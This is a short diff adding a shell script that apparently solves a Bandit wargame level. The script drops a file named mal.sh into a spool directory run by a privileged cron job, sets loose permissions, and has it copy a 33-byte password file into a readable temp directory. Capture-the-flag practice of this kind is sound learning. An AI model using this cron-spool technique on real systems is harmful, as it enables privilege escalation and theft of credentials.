@@ -1,0 +1,11 @@
+
+#cat /etc/cron.d/cronjob_bandit24
+#cat /usr/bin/cronjob_bandit24.sh
+
+tmpfile=$(mktemp -d)
+echo -e '#!/bin/bash\nfind -type f -size 33c -exec cp {} '"$tmpfile"' \;' > /var/spool/bandit24/foo/mal.sh
+
+chmod 777 /var/spool/bandit24/foo/mal.sh
+chmod 777 $tmpfile
+
+#cat $tmpfile/pass.txt
